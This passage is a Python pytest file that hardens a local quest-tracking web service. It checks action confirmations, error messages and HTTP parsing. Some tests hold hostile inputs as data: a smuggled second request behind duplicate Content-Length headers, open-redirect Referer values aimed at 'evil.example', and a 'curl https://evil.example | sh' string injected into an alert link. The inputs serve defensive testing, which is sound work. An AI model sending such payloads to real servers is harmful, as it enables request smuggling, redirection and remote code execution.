    submission had failed while `submission.yaml` sat on disk — and their next attempt was
    refused, because the attempt was already submitted.
    """

    @pytest.fixture
    def failing_rebuild(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from quest_app import actions

        def unwritable(*_args: Any, **_kwargs: Any) -> None:
            raise OSError(20, "Not a directory")

        monkeypatch.setattr(actions, "build_site", unwritable)

    def test_submission_succeeds_with_an_advisory(
        self, service: tuple[str, str], failing_rebuild: None, config: AppConfig
    ) -> None:
        base, token = service
        status, body = post(
            base,
            {
                "action": "submit-for-review",
                "quest_id": "jira-read-assigned-stories",
                "token": token,
                "confirm": True,
            },
        )
        assert status == 200, body
        assert any("rebuilt" in advisory for advisory in body["advisories"]), body["advisories"]
        assert "submitted" in (config.participant_root / "progress.yaml").read_text()

    def test_a_validation_run_succeeds_with_an_advisory(
        self, service: tuple[str, str], failing_rebuild: None
    ) -> None:
        base, token = service
        status, body = post(
            base,
            {
                "action": "run-validator",
                "quest_id": "jira-read-assigned-stories",
                "validator_id": "validate-jira-read-assigned",
                "token": token,
            },
        )
        assert status == 200, body
        assert any("rebuilt" in advisory for advisory in body["advisories"]), body["advisories"]


class TestEveryCallerMeetsTheConfirmation:
    """C21 belongs to the action layer, so every caller meets it (ADR-033).

    Until round 8 it was checked in the form handler and nowhere else: the JSON endpoint
    and `quest-app action` performed the same actions unconfirmed, and `record-review` —
    the one action that produces verified completion and verified XP — was not in the list
    at all, so even the form route confirmed it only in a `window.confirm` dialog.
    """

    def test_a_json_action_without_the_confirmation_is_refused(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        base, token = service
        status, body = post(
            base,
            {"action": "start-quest", "quest_id": "ba-ingest-transcript", "token": token},
        )
        assert status == 400, body
        assert "confirm it" in body["error"]
        progress = config.participant_root / "progress.yaml"
        assert "ba-ingest-transcript" not in progress.read_text()

    def test_an_approval_posted_without_the_checkbox_records_nothing(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        """The no-JavaScript route, where `window.confirm` never runs."""
        base, token = service
        before = (config.participant_root / "progress.yaml").read_text()
        location = TestTheAdvisoryReachesTheBrowser._redirect_of(
            base,
            "/api/action/record-review/jira-read-assigned-stories",
            {
                "token": token,
                "decision": "approved",
                "reviewer_name": "A Reviewer",
                "verification_statement": "I read every numbered criterion against the evidence.",
            },
        )
        assert "problem=" in location, location
        assert "confirm it" in _flash_on(base, location)
        assert (config.participant_root / "progress.yaml").read_text() == before


def _raw_exchange(base: str, request_lines: str) -> list[str]:
    """Send bytes exactly as written and return the status lines that came back.

    `urllib` normalises what this needs to send malformed on purpose: two lengths, a
    smuggled second request, a Referer the library would rewrite.
    """
    import socket

    host, port = base.removeprefix("http://").rsplit(":", 1)
    with socket.create_connection((host.strip("[]"), int(port)), timeout=10) as sock:
        sock.sendall(request_lines.encode())
        received = b""
        sock.settimeout(2)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                received += chunk
        except TimeoutError:
            pass
    return [line for line in received.decode("latin-1").splitlines() if line.startswith("HTTP/")]


class TestTheReadPathAnswersItsOwnFailures:
    """Both write handlers catch everything; this one caught nothing until round 8."""

    def test_an_unreadable_page_is_answered_rather_than_dropped(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        import os

        if os.geteuid() == 0:
            pytest.skip("root reads a mode-000 file, so there is no failure to answer")
        page = config.generated_root / "map" / "index.html"
        mode = page.stat().st_mode
        page.chmod(0o000)
        try:
            statuses = _raw_exchange(
                service[0],
                f"GET /map/ HTTP/1.1\r\nHost: 127.0.0.1:{service[0].rsplit(':', 1)[1]}\r\n"
                "Connection: close\r\n\r\n",
            )
        finally:
            page.chmod(mode)

        assert statuses, "the connection closed with no status and no body"
        assert statuses[0].startswith("HTTP/1.1 500")


class TestAReadFailureIsNotReportedAsAWriteFailure:
    """Round 13 E8.

    Hashing the evidence to submit it is a read; the participant directory is not being
    written to at all yet. An unreadable file inside the evidence package used to escape as
    a bare `OSError`, and this service's action handlers turn any `OSError` from a mutating
    action into "the change could not be written to your participant directory" — wording
    that would have been actively wrong here, and worse, a crash and a traceback never even
    reached the participant to be wrong at.
    """

    def test_an_unreadable_evidence_file_blocks_submission_cleanly(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        import os

        if os.geteuid() == 0:
            pytest.skip("root reads a mode-000 file, so there is no failure to answer")
        base, token = service
        evidence = config.resolve_participant_path(
            "participant/evidence/jira-read-assigned-stories/jira-attempt-001"
        )
        target = evidence / "unreadable.md"
        target.write_text("anything\n")
        target.chmod(0)
        try:
            status, body = post(
                base,
                {
                    "action": "submit-for-review",
                    "quest_id": "jira-read-assigned-stories",
                    "token": token,
                    "confirm": True,
                },
            )
        finally:
            target.chmod(0o600)

        assert status == 409, body
        assert "could not be read" in body["error"], body
        assert "could not be written" not in body["error"], body
        assert str(config.repo_root) not in body["error"]


class TestASecondContentLengthIsNotAWayIn:
    """`get` returns the first header; the body hides behind the second."""

    def test_two_lengths_on_a_get_are_refused(self, service: tuple[str, str]) -> None:
        base = service[0]
        port = base.rsplit(":", 1)[1]
        smuggled = "GET /api/health HTTP/1.1\r\nHost: 127.0.0.1:" + port + "\r\n\r\n"
        statuses = _raw_exchange(
            base,
            f"GET / HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
            "Content-Length: 0\r\n"
            f"Content-Length: {len(smuggled)}\r\n\r\n{smuggled}",
        )

        assert statuses, "no answer at all"
        assert statuses[0].startswith("HTTP/1.1 400"), statuses
        assert len(statuses) == 1, f"the smuggled request was answered too: {statuses}"


class TestTheRefusalStaysOnThisMachine:
    """`Location` is built from the Referer's path, which the origin check never reads."""

    @pytest.mark.parametrize("referer_path", ["//evil.example/x", "/\\evil.example/x"])
    def test_a_protocol_relative_referer_cannot_redirect_off_site(
        self, service: tuple[str, str], referer_path: str
    ) -> None:
        base, token = service
        port = base.rsplit(":", 1)[1]
        body = urllib.parse.urlencode({"token": token, "confirm": "yes"})
        request = (
            f"POST /api/action/mark-evidence-ready/does-not-exist/ HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{port}\r\n"
            f"Referer: http://127.0.0.1:{port}{referer_path}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}"
        )
        import socket

        with socket.create_connection(("127.0.0.1", int(port)), timeout=10) as sock:
            sock.sendall(request.encode())
            received = b""
            while b"\r\n\r\n" not in received:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                received += chunk
        headers = received.decode("latin-1")
        location = next(
            line.split(":", 1)[1].strip()
            for line in headers.splitlines()
            if line.lower().startswith("location:")
        )

        assert not location.startswith("//"), location
        assert location.startswith("/"), location
        assert "evil.example" not in location
        assert "\\" not in location


class TestRequestsThatFailBeforeAnyAction:
    def test_a_link_cannot_put_its_own_words_in_the_alert(self, service: tuple[str, str]) -> None:
        base, _ = service
        text = _flash_on(base, "/?problem=Run%20curl%20https%3A%2F%2Fevil.example%20%7C%20sh")
        assert "evil.example" not in text
        assert "did not happen" not in text

    def test_deep_nesting_is_refused_as_bad_json(self, service: tuple[str, str]) -> None:
        base, _ = service
        status, body = post(base, raw=b"[" * 60000)
        assert status == 400, body
        assert "recorded" not in json.dumps(body)

    def test_parameters_that_are_not_an_object_are_refused(self, service: tuple[str, str]) -> None:
        base, token = service
        status, body = post(
            base,
            {
                "token": token,
                "action": "run-validator",
                "quest_id": "base-camp-repository-safety",
                "validator_id": "validate-repository-foundation",
                "parameters": [1],
            },
        )
        assert status == 400, body
        assert "recorded" not in json.dumps(body)

    def test_a_body_that_never_arrives_is_given_up_on(
        self, service: tuple[str, str], monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import socket

        from quest_app.serve import ActionHandler

        monkeypatch.setattr(ActionHandler, "timeout", 1)
        base, _ = service
        port = int(base.rsplit(":", 1)[1])
        started = time.monotonic()
        with socket.create_connection(("127.0.0.1", port), timeout=10) as sock:
            sock.sendall(
                f"POST /api/action HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
                "Content-Type: application/json\r\nContent-Length: 100\r\n\r\n{".encode()
            )
            assert sock.recv(4096) == b""
        assert time.monotonic() - started < 8


class TestAnIPv6LoopbackBindIsUsable:
    """`::1` is accepted at bind time, advertised in `--host`, and printed on start."""

    @pytest.fixture
    def ipv6_service(self, config: AppConfig) -> Iterator[tuple[str, str]]:
        import socket

        if not socket.has_ipv6:
            pytest.skip("no IPv6 on this machine")
        bound = AppConfig.for_repo(
            config.repo_root,
            participant_root=config.participant_root,
            service_port=0,
            service_host="::1",
        )
        report = ProblemReport()
        world = load_world(bound, report)
        assert world is not None, report.to_text()
        build_site(world)
        try:
            server, state = create_server(bound)
        except OSError:  # pragma: no cover - a machine with IPv6 compiled in but disabled
            pytest.skip("this machine cannot bind ::1")
        port = server.server_address[1]
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            yield f"http://[::1]:{port}", state.token
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=5)

    def test_the_name_a_browser_sends_is_accepted(self, ipv6_service: tuple[str, str]) -> None:
        base, _ = ipv6_service
        port = base.rsplit(":", 1)[1]
        statuses = _raw_exchange(
            base, f"GET /api/health HTTP/1.1\r\nHost: [::1]:{port}\r\nConnection: close\r\n\r\n"
        )

        assert statuses and statuses[0].startswith("HTTP/1.1 200"), statuses


class TestAPublishInFlightIsNotAMissingPage:
    """The publish is two renames, and the service serves through both of them."""

    def test_a_request_during_the_swap_gets_the_page(
        self, service: tuple[str, str], config: AppConfig
    ) -> None:
        base, _ = service
        generated = config.generated_root
        previous = generated.with_suffix(".previous")
        generated.rename(previous)

        def finish_the_swap() -> None:
            time.sleep(0.05)
            previous.rename(generated)

        thread = threading.Thread(target=finish_the_swap)
        thread.start()
        try:
            request = urllib.request.Request(f"{base}/map/")  # noqa: S310 - loopback
            with urllib.request.urlopen(request, timeout=10) as response:  # noqa: S310
                status = response.status
        finally:
            thread.join(timeout=5)
            if previous.exists() and not generated.exists():
                previous.rename(generated)

        assert status == 200, "a rebuild in flight was reported as a page that does not exist"


class TestTheWritePathAnswersItsOwnFailures:
    """`do_GET` has answered every failure since round 7. `do_POST` answered none.

    Its inner catch-all answers by writing to the socket, so when the socket is what
    failed — a participant who submits and then closes the tab — that write raised again,
    past every handler, onto the terminal the participant is watching.
    """

    def test_an_unexpected_failure_in_the_write_path_is_answered(
        self, service: tuple[str, str], monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from quest_app.serve import ActionHandler

        def explode(self: ActionHandler) -> None:
            raise RuntimeError("something no one anticipated")

        monkeypatch.setattr(ActionHandler, "_post", explode)
        base, token = service
        status, body = post(base, {"token": token, "action": "start-quest"})

        assert status == 500
        assert "Something unexpected went wrong" in str(body)
        assert "RuntimeError" in str(body)

    def test_a_reader_who_goes_away_mid_write_is_not_a_traceback(
        self,
        service: tuple[str, str],
        monkeypatch: pytest.MonkeyPatch,
        capfd: pytest.CaptureFixture[str],
    ) -> None:
        from quest_app.serve import ActionHandler

        def gone(self: ActionHandler) -> None:
            raise BrokenPipeError(32, "Broken pipe")

        monkeypatch.setattr(ActionHandler, "_post", gone)
        base, token = service
        capfd.readouterr()
        with contextlib.suppress(Exception):
            post(base, {"token": token, "action": "start-quest"})
        time.sleep(0.3)

        captured = capfd.readouterr()
        assert "Traceback" not in captured.err, captured.err


def test_a_read_failure_is_not_reported_as_a_failed_write(
    service: tuple[str, str], monkeypatch: pytest.MonkeyPatch
) -> None:
    """A page the service cannot open has nothing to do with the participant directory.

    The read path reported its failures with the write path's sentence, so a reader was
    told their change could not be written — when nothing was being changed — and sent to
    check a tree that was never involved.
    """
    import errno

    from quest_app.serve import ActionHandler

    def unreadable(self: ActionHandler) -> None:
        raise OSError(errno.EACCES, "Permission denied")

    monkeypatch.setattr(ActionHandler, "_get", unreadable)
    base, _ = service
    request = urllib.request.Request(f"{base}/passport/")  # noqa: S310
    try:
        with urllib.request.urlopen(request, timeout=10) as response:  # noqa: S310
            body = response.read().decode()
    except urllib.error.HTTPError as error:
        body = error.read().decode()

    assert "generated site" in body, body
    assert "participant directory" not in body, body
    assert "quest-app build" in body


class TestTheProbeAsksAboutThisRepository:
    """A service of this application is not the same thing as this repository's service.

    The probe accepted any answer carrying the application header, so a second clone on one
    machine — two participants, or a reviewer with the curriculum checked out twice — made
    `quest-app build` publish pages saying the service was running, with live-looking
    controls, for a repository that had no service at all.
    """

    def test_a_service_for_another_repository_is_not_this_one(
        self, service: tuple[str, str], config: AppConfig, tmp_path: Path
    ) -> None:
        import dataclasses

        from quest_app.serve import PORTS_DIRNAME, is_service_running

        base, _ = service
        port = int(base.rsplit(":", 1)[1])

        mine = dataclasses.replace(config, service_port=port)
        directory = mine.local_data_root / PORTS_DIRNAME
        directory.mkdir(parents=True, exist_ok=True)
        (directory / str(port)).write_text(f"{port}\n")
        assert is_service_running(mine), "its own service answers for it"

        elsewhere = dataclasses.replace(
            mine,
            repo_root=tmp_path / "another-clone",
            participant_root=tmp_path / "another-clone" / "participant",
        )
        assert not is_service_running(elsewhere), (
            "a different clone's service answered on the port and was believed"
        )
